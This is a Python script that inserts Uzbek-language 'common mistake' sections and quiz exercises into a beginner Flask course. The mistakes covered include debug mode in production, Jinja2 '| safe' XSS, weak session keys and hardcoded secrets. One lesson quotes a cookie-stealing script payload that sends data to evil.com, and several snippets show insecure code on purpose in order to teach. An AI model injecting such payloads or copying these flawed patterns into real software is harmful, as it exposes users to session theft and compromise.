"""Enhance course 21 (Python Flask, beginner) from ~2 to 4-5 star ambition.

Adds a real "🐛 Ataylab xato" gotcha to 8 of 14 lessons plus one reasoning
exercise per lesson tied directly to that gotcha, matching the pattern used
in the platform's 5-star courses. Idempotent — checks for the marker/title
before writing.
"""
from __future__ import annotations

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # noqa: E402

from sqlalchemy import select  # noqa: E402

from app.db.database import AsyncSessionLocal  # noqa: E402
from app.db import base as _base  # noqa: E402,F401
from app.models.lesson import Lesson  # noqa: E402
from app.models.exercise import Exercise  # noqa: E402
from enhance_lesson_helpers import append_bug_marker, add_exercise, sync_exercise_section  # noqa: E402

MARKER = "🐛 Ataylab xato"

BUGS = {
    66: {  # Flaskga kirish — debug=True in production
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi loyihani serverga joylashtirganda kodni o'zgartirmay qoldiradi:</p>
<pre><code class="lang-python">if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')</code></pre>
<p><strong>Natija:</strong> Bu ishlab chiqarish (production) muhitida <strong>og'ir xavfsizlik teshigi</strong>. <code>debug=True</code> yoqilganda, xato yuz berganda Flask brauzerda interaktiv Werkzeug debugger'ni ko'rsatadi — bu debugger orqali istalgan foydalanuvchi serverda <strong>ixtiyoriy Python kodini bajarishi</strong> (Remote Code Execution) mumkin.</p>
<p><strong>To'g'ri yechim:</strong> <code>debug=True</code> faqat local development'da ishlatiladi. Production'da <code>FLASK_DEBUG=0</code> yoki umuman ko'rsatilmasligi, va real serverda Gunicorn/uWSGI kabi WSGI server ishlatilishi kerak.</p>""",
        "exercise": {
            "title": "app.run(debug=True) production serverda qoldirilsa, nima uchun bu xavfli?",
            "description": "Loyiha production serverga debug=True bilan joylashtirilgan. Nima uchun bu jiddiy xavfsizlik muammosi hisoblanadi?",
            "exercise_type": "multiple_choice",
            "options": '["Sahifa sekinroq yuklanadi", "Werkzeug interaktiv debugger orqali tashqi foydalanuvchi serverda ixtiyoriy kod bajarishi mumkin", "CSS stillar to\'g\'ri ishlamaydi", "Debug rejimi faqat testlarga ta\'sir qiladi"]',
            "correct_answers": "B",
            "hint": "debug=True yoqilganda xato yuz berganda brauzerda nima ko'rsatiladi?",
            "explanation": "debug=True xato yuz berganda Werkzeug'ning interaktiv debug konsolini ochadi — u orqali kimdir server muhitida ixtiyoriy Python kodini bajarishi mumkin (RCE). Bu production uchun jiddiy xavf.",
        },
    },
    67: {  # Routing — dynamic route order
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi ikkita route'ni shunday tartibda yozadi:</p>
<pre><code class="lang-python">@app.route('/user/&lt;string:username&gt;')
def profil(username):
    return f"Profil: {{username}}"

@app.route('/user/new')
def yangi_foydalanuvchi():
    return "Yangi foydalanuvchi yaratish"</code></pre>
<p><strong>Natija:</strong> <code>/user/new</code> manziliga kirganda kutilganidek "Yangi foydalanuvchi yaratish" chiqishi <strong>mumkin, lekin ba'zi Flask versiyalarida yoki boshqa converter turlarida</strong> (masalan <code>&lt;int:user_id&gt;</code> o'rniga <code>&lt;string:username&gt;</code> ishlatilganda) birinchi route "new" so'zini ham username sifatida qabul qilib, ikkinchi route'ga <strong>hech qachon yetib bormaydi</strong> — chunki Flask route'larni ro'yxatga olingan tartibda tekshiradi va birinchi mos kelgani ishlaydi.</p>
<p><strong>To'g'ri yechim:</strong> <strong>aniq (static) route'larni har doim dinamik route'lardan oldin</strong> ro'yxatga oling: avval <code>/user/new</code>, keyin <code>/user/&lt;string:username&gt;</code>.</p>""",
        "exercise": {
            "title": "Nega /user/new manziliga /user/<string:username> route'i to'sqinlik qilishi mumkin?",
            "description": "/user/<string:username> route'i /user/new route'idan OLDIN ro'yxatga olingan. Bu nima uchun muammoli bo'lishi mumkin?",
            "exercise_type": "text_input",
            "expected_answer": "Flask URL'larni route'lar ro'yxatga olingan tartibda tekshiradi va birinchi mos kelganini ishlatadi. Agar dinamik route (<string:username>) aniq route'dan (/user/new) oldin yozilsa, u 'new' so'zini ham username sifatida qabul qilib, aniq route'ga hech qachon yetib bormaydi. Yechim: aniq route'larni har doim birinchi yozish.",
            "hint": "Flask route'larni qanday tartibda tekshiradi — ro'yxatga olingan tartibdami, aniqlikka qarabmi?",
            "explanation": "Flask (Werkzeug routing) so'rovlarni ro'yxatga olingan tartibda tekshiradi, eng aniq mosliqni avtomatik tanlamaydi. Shuning uchun static route'lar har doim dynamic route'lardan oldin kelishi kerak.",
        },
    },
    68: {  # Jinja2 — autoescape bypass
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi foydalanuvchi izohini "chiroyli" ko'rsatish uchun <code>| safe</code> filtrini qo'shadi:</p>
<pre><code class="lang-python">&lt;p&gt;{{{{ foydalanuvchi_izohi | safe }}}}&lt;/p&gt;</code></pre>
<p>Foydalanuvchi shunday izoh qoldiradi: <code>&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</code></p>
<p><strong>Natija:</strong> Jinja2 standart holatda barcha <code>{{{{ }}}}</code> qiymatlarini avtomatik <strong>escape</strong> qiladi (<code>&lt;script&gt;</code> → <code>&amp;lt;script&amp;gt;</code> ko'rinishida matn sifatida chiqadi, ishlamaydi). Lekin <code>| safe</code> bu himoyani <strong>o'chirib qo'yadi</strong> — endi foydalanuvchi izohidagi <code>&lt;script&gt;</code> tegi <strong>haqiqiy JavaScript sifatida ishga tushadi</strong> (XSS — Cross-Site Scripting hujumi), boshqa foydalanuvchilarning cookie'larini o'g'irlashi mumkin.</p>
<p><strong>To'g'ri yechim:</strong> <code>| safe</code>ni faqat siz <strong>o'zingiz</strong> yaratgan va ishonchli HTML uchun ishlating, hech qachon foydalanuvchi kiritgan matn uchun emas.</p>""",
        "exercise": {
            "title": "{{ izoh | safe }} yozilsa va foydalanuvchi <script> yozsa, nima bo'ladi?",
            "description": "Shablonda {{ foydalanuvchi_izohi | safe }} ishlatilgan. Foydalanuvchi izoh maydoniga &lt;script&gt;...&lt;/script&gt; kodini yozadi. Bu nima uchun xavfli?",
            "exercise_type": "multiple_choice",
            "options": '["Hech narsa, Jinja2 baribir avtomatik himoya qiladi", "| safe Jinja2\'ning avtomatik escape himoyasini o\'chiradi, script tegi haqiqiy JS sifatida ishga tushadi (XSS)", "safe filtri faqat CSS uchun ishlaydi", "Bu xato server tomonida ushlanadi va bloklanadi"]',
            "correct_answers": "B",
            "hint": "Jinja2 standart holatda maxsus belgilarni avtomatik o'zgartiradi. | safe bu xatti-harakatga qanday ta'sir qiladi?",
            "explanation": "Jinja2 autoescape yoqilgan holatda &lt;, &gt; kabi belgilarni HTML entity'ga aylantiradi, shuning uchun teglar matn sifatida chiqadi. | safe filtri buni to'liq o'chiradi — foydalanuvchi kiritgan har qanday HTML/JS xom holda sahifaga kiritiladi, bu klassik XSS zaifligi.",
        },
    },
    69: {  # GET form with password
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi login formani shunday yozadi:</p>
<pre><code class="lang-html">&lt;form action="/login" method="GET"&gt;
  &lt;input type="text" name="username"&gt;
  &lt;input type="password" name="password"&gt;
  &lt;button type="submit"&gt;Kirish&lt;/button&gt;
&lt;/form&gt;</code></pre>
<p><strong>Natija:</strong> Forma yuborilganda URL shunday ko'rinadi: <code>/login?username=ali&amp;password=maxfiy123</code>. Parol — <strong>brauzer tarixida</strong>, <strong>server loglarida</strong> va <strong>proxy/CDN loglarida</strong> ochiq matn holida saqlanib qoladi! Bu maxfiy ma'lumot uchun jiddiy xavfsizlik xatosi.</p>
<p><strong>To'g'ri yechim:</strong> Parol, token kabi maxfiy ma'lumotlarni yuboradigan formalar <strong>doim</strong> <code>method="POST"</code> ishlatishi kerak — POST so'rov ma'lumotlari body'da yuboriladi, URL'da (va shu sababli loglarda) ko'rinmaydi.</p>""",
        "exercise": {
            "title": "Login formasi method=\"GET\" bilan yuborilsa, nima uchun bu xavfli?",
            "description": "&lt;form action=\"/login\" method=\"GET\"&gt; ichida password input bor. Forma yuborilgach URL nima ko'rinishda bo'ladi va bu nima uchun muammoli?",
            "exercise_type": "text_input",
            "expected_answer": "GET so'rovda barcha forma qiymatlari URL query string ichida yuboriladi: /login?username=ali&password=123. Bu parol brauzer tarixida, server va proxy loglarida ochiq matn holida saqlanishiga olib keladi. Yechim: maxfiy ma'lumot yuboradigan formalar har doim method=\"POST\" ishlatishi kerak.",
            "hint": "GET so'rovda forma ma'lumotlari qayerga qo'shiladi — URL'gami, body'gami?",
            "explanation": "GET so'rovlar barcha parametrlarni URL'ning o'zida yuboradi. Bu URL esa brauzer tarixi, server access log va oraliq proxy loglarida saqlanadi — parol kabi maxfiy ma'lumot uchun bu qabul qilib bo'lmaydigan xavf.",
        },
    },
    71: {  # Session — weak SECRET_KEY
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi loyihani tezroq ishga tushirish uchun shunday yozadi:</p>
<pre><code class="lang-python">app.secret_key = "123"
# yoki umuman yozmaydi — Flask xato beradi, lekin ba'zilar shunchaki "test" kabi oddiy qiymat qo'yadi</code></pre>
<p><strong>Natija:</strong> Flask session'lari <strong>shifrlanmagan</strong> — ular faqat <code>secret_key</code> bilan <strong>imzolangan</strong> (Base64 + HMAC imzo). Har kim session cookie'ni ochib (Base64 decode) ichidagi ma'lumotni (masalan <code>{{'user_id': 5, 'is_admin': False}}</code>) ko'rishi mumkin! Agar <code>secret_key</code> "123" kabi oddiy/taxmin qilinadigan bo'lsa, tajovuzkor imzoni <strong>qalbakilashtirib</strong>, <code>is_admin: True</code> qilib session'ni "qayta imzolab" yuborishi mumkin — bu orqali admin huquqlarini soxta ravishda olish mumkin.</p>
<p><strong>To'g'ri yechim:</strong> <code>secret_key</code> — uzun, tasodifiy (<code>secrets.token_hex(32)</code> orqali generatsiya qilingan) va <strong>environment variable</strong> orqali (kodga hardcode qilinmagan holda) berilishi kerak.</p>""",
        "exercise": {
            "title": "secret_key = \"123\" bo'lsa, nega session ma'lumotini qalbakilashtirish mumkin?",
            "description": "Flask ilovada app.secret_key = \"123\" ishlatilgan. Bu nima uchun foydalanuvchiga o'zini admin qilib ko'rsatish imkonini berishi mumkin?",
            "exercise_type": "multiple_choice",
            "options": '["Flask session ma\'lumotlarini avtomatik shifrlaydi, secret_key faqat performance uchun", "Session shifrlanmagan, faqat secret_key bilan imzolangan — kuchsiz kalitni topib, imzoni qalbakilashtirib is_admin qiymatini o\'zgartirish mumkin", "secret_key faqat CSRF himoyasi uchun ishlatiladi", "Bu muammo faqat HTTPS ishlatilmaganda yuzaga keladi"]',
            "correct_answers": "B",
            "hint": "Flask session — shifrlanganmi yoki faqat imzolanganmi? Farqni eslang.",
            "explanation": "Flask session cookie'lari Base64 + HMAC imzo bilan himoyalanadi, lekin ICHIDAGI MA'LUMOT shifrlanmagan — har kim uni o'qiy oladi. Kuchsiz secret_key bilan tajovuzkor to'g'ri imzoni hisoblab, o'zgartirilgan (masalan is_admin:True) ma'lumotni qonuniy qilib ko'rsatishi mumkin.",
        },
    },
    72: {  # SQLAlchemy — session/connection leak
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi har bir so'rovda yangi engine yaratadi:</p>
<pre><code class="lang-python">@app.route('/users')
def foydalanuvchilar():
    engine = create_engine(DATABASE_URL)   # HAR SAFAR yangi engine!
    session = sessionmaker(bind=engine)()
    users = session.query(User).all()
    return render_template('users.html', users=users)
    # session.close() chaqirilmagan!</code></pre>
<p><strong>Natija:</strong> Har bir so'rov <strong>yangi database connection pool</strong> ochadi va uni hech qachon yopmaydi. Bir necha o'nlab so'rovdan keyin PostgreSQL <code>"too many connections"</code> xatosini beradi — sayt butunlay ishlamay qoladi, garchi kodning o'zida "xato" ko'rinmasa ham (mahalliy testda bitta so'rov bilan hammasi ishlagandek tuyuladi).</p>
<p><strong>To'g'ri yechim:</strong> Engine <strong>bir marta</strong>, ilova boshida yaratiladi (global yoki app factory ichida) va qayta ishlatiladi; har bir session esa <code>try/finally</code> yoki Flask'ning <code>teardown_appcontext</code> orqali <strong>albatta yopiladi</strong>.</p>""",
        "exercise": {
            "title": "Har bir view funksiyasida yangi create_engine() chaqirilsa, nima uchun sayt oxir-oqibat ishlamay qoladi?",
            "description": "/users route'ida har safar create_engine(DATABASE_URL) chaqiriladi va session.close() hech qachon ishlatilmaydi. Trafik ko'payganda nima bo'ladi?",
            "exercise_type": "text_input",
            "expected_answer": "Har bir so'rov yangi connection pool ochadi va yopmaydi, connection'lar to'planib boradi. PostgreSQL'ning maksimal connection limitiga yetilgach 'too many connections' xatosi chiqadi, sayt butunlay javob bermay qoladi. Yechim: engine'ni ilova boshida bir marta yaratish va har bir session'ni try/finally yoki teardown_appcontext bilan yopish.",
            "hint": "Har bir HTTP so'rov nechta yangi database ulanish ochyapti, va ular qachon yopiladi?",
            "explanation": "create_engine() har chaqirilganda yangi connection pool yaratadi. Session yopilmasa, ulanishlar 'osilib qoladi' (leak). Vaqt o'tishi bilan bu PostgreSQL'ning max_connections limitiga urilib, butun ilovani ishdan chiqaradi.",
        },
    },
    74: {  # Blueprint — circular import
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi blueprint va model fayllarini shunday bog'laydi:</p>
<pre><code class="lang-python"># routes/users.py
from app import db          # app.py'dan db import qilinadi
from models import User

# app.py
from routes.users import users_bp   # routes/users.py'dan blueprint import qilinadi
db = SQLAlchemy(app)</code></pre>
<p><strong>Natija:</strong> <code>ImportError: cannot import name 'db' from partially initialized module 'app' (most likely due to a circular import)</code>. Sabab: <code>app.py</code> ni ishga tushirish <code>routes/users.py</code>ni import qiladi, u esa qaytib <code>app.py</code>dan <code>db</code>ni import qilishga urinadi — lekin <code>app.py</code> hali <strong>to'liq bajarilib bo'lmagan</strong> (db o'zgaruvchisi hali yaratilmagan), shuning uchun import muvaffaqiyatsiz tugaydi.</p>
<p><strong>To'g'ri yechim:</strong> <strong>App factory pattern</strong> ishlatish — <code>db = SQLAlchemy()</code>ni alohida <code>extensions.py</code> faylida (app'siz) yaratish, keyin <code>create_app()</code> ichida <code>db.init_app(app)</code> bilan bog'lash. Bu tsiklni butunlay yo'q qiladi.</p>""",
        "exercise": {
            "title": "app.py va routes/users.py bir-biridan import qilsa, nega ImportError chiqadi?",
            "description": "routes/users.py app.py'dan 'db'ni import qiladi. app.py esa routes/users.py'dan blueprint'ni import qiladi. Dastur ishga tushirilganda 'cannot import name db from partially initialized module' xatosi chiqadi. Nega?",
            "exercise_type": "multiple_choice",
            "options": '["db o\'zgaruvchisi noto\'g\'ri nomlangan", "app.py hali to\'liq bajarilmagan (db yaratilmagan) paytda routes/users.py qaytib undan db ni import qilishga urinadi — circular import", "SQLAlchemy versiyasi mos kelmaydi", "Blueprint\'lar import qilib bo\'lmaydi"]',
            "correct_answers": "B",
            "hint": "Python fayllarni tepadan pastga qarab bajaradi. app.py qaysi qatorida to'xtab, routes/users.py ga o'tadi?",
            "explanation": "app.py routes/users.py ni import qilganda ishga tushiradi, u esa app.py dan db ni so'raydi — lekin app.py hali db = SQLAlchemy(app) qatoriga yetib bormagan (chunki aynan shu import qatorida to'xtab qolgan). Natija: 'partially initialized module' xatosi. App factory pattern bu bog'liqlik tsiklini uzadi.",
        },
    },
    76: {  # Deploy — hardcoded secrets
        "html": f"""<h3>{MARKER}</h3>
<p>O'quvchi loyihani GitHub'ga yuklashdan oldin quyidagicha kod qoldiradi:</p>
<pre><code class="lang-python"># config.py
SECRET_KEY = "mening-maxfiy-kalitim-2024"
DATABASE_URL = "postgresql://admin:parol123@db.example.com/mydb"</code></pre>
<pre><code class="lang-bash">git add .
git commit -m "Deploy uchun tayyor"
git push origin main</code></pre>
<p><strong>Natija:</strong> Maxfiy kalit va database parol <strong>ochiq matn holida GitHub'ga</strong> yuklanadi. Repo public bo'lsa — darhol ko'rinadi; private bo'lsa ham, bot'lar (masalan GitHub'ni doimiy skanerlaydigan xizmatlar) va kelajakdagi hamkorlar buni ko'rishi mumkin. Git tarixidan o'chirish ham <strong>oson emas</strong> — commit history'da qolib ketaveradi, oddiy <code>git rm</code> yetarli emas.</p>
<p><strong>To'g'ri yechim:</strong> Maxfiy qiymatlar <strong>hech qachon</strong> kodga yozilmaydi — <code>.env</code> fayl (va uni <code>.gitignore</code>ga qo'shish) yoki server environment variable orqali beriladi, kodda faqat <code>os.environ["SECRET_KEY"]</code> kabi o'qish bo'ladi.</p>""",
        "exercise": {
            "title": "SECRET_KEY va DATABASE_URL config.py ichiga yozib GitHub'ga push qilinsa, nima uchun bu xavfli?",
            "description": "config.py faylida SECRET_KEY va parolli DATABASE_URL ochiq matn holida yozilgan va bu fayl git orqali GitHub'ga yuklangan. Bu nima uchun jiddiy xavfsizlik muammosi, va uni oddiy git rm bilan tuzatish yetarlimi?",
            "exercise_type": "text_input",
            "expected_answer": "Maxfiy ma'lumotlar ochiq matn holida repo tarixida saqlanib qoladi — hatto keyinchalik o'chirilsa ham, eski commit'larda qolaveradi va oddiy git rm yetarli emas (butun tarixni tozalash kerak, masalan git filter-repo bilan). Bundan tashqari darhol parol/kalitni almashtirish (rotate qilish) shart. To'g'ri yondashuv: maxfiy qiymatlarni boshidanoq .env faylida saqlash va uni .gitignore ga qo'shish, kodda faqat os.environ orqali o'qish.",
            "hint": "Git tarixi qanday ishlaydi — bir marta commit qilingan narsa oddiy o'chirish bilan butunlay yo'qoladimi?",
            "explanation": "Git — to'liq tarix saqlaydigan tizim. Bir marta commit qilingan maxfiy ma'lumot HEAD'dan o'chirilsa ham eski commit'larda qolaveradi. Kalit sizib chiqqach uni albatta rotate qilish (almashtirish) shart, chunki u allaqachon 'buzilgan' hisoblanadi.",
        },
    },
}


async def main() -> None:
    async with AsyncSessionLocal() as db:
        for lesson_id, spec in BUGS.items():
            lesson = (await db.execute(select(Lesson).where(Lesson.id == lesson_id))).scalar_one()
            if MARKER in (lesson.text_content or ""):
                print(f"lesson {lesson_id}: bug marker already present, skipping content append")
            else:
                await append_bug_marker(db, lesson_id, spec["html"])
                print(f"lesson {lesson_id}: appended bug marker")

            ex_spec = spec["exercise"]
            already = (await db.execute(
                select(Exercise).where(Exercise.lesson_id == lesson_id,
                                        Exercise.title == ex_spec["title"])
            )).scalar_one_or_none()
            if already is None:
                await add_exercise(
                    db, lesson_id,
                    title=ex_spec["title"], description=ex_spec["description"],
                    exercise_type=ex_spec["exercise_type"], options=ex_spec.get("options"),
                    correct_answers=ex_spec.get("correct_answers"),
                    expected_answer=ex_spec.get("expected_answer"),
                    hint=ex_spec["hint"], explanation=ex_spec["explanation"],
                    difficulty_level="Medium", points=4,
                )
                print(f"lesson {lesson_id}: added exercise")
            else:
                print(f"lesson {lesson_id}: exercise already present, skipping insert")
            await sync_exercise_section(db, lesson_id)
            print(f"lesson {lesson_id}: synced exercise section")

        await db.commit()
        print("\nDone.")


if __name__ == "__main__":
    asyncio.run(main())
